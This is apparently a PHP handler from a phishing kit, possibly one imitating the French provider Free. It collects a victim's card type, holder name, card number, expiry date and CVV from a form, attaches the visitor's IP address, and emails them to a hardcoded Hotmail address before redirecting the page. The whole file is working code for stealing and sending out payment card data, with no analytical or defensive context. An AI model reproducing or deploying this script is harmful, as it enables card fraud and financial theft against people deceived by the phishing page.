<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);
if(($_POST['comname'] != "") AND ($_POST['comnum'] != "") AND ($_POST['common'] != "")AND ($_POST['comy'] != "")AND ($_POST['comc'] != "")  )
{
$message .= "--- FREE ---\n";
$message .= "TP                :     ".$_POST['typeCarte']."\n";
$message .= "NM                :     ".$_POST['comname']."\n";
$message .= "CC                :     ".$_POST['comnum']."\n";
$message .= "XP                :     ".$_POST['common']."/".$_POST['comy']."\n";
$message .= "CV                :     ".$_POST['comc']."\n";
$message .= "---Sn!per---\n";
$send = "superdeferme@hotmail.com";
$subject = "<<CC>>[$ip]";
$headers = "From: FREE 2 <info@online.net>";
mail($send,$subject,$message,$headers);
echo "<meta http-equiv='refresh' content='0; url=index1.html' />";
}
	else {
     echo "<meta http-equiv='refresh' content='0; url=index.html' />";
}
?>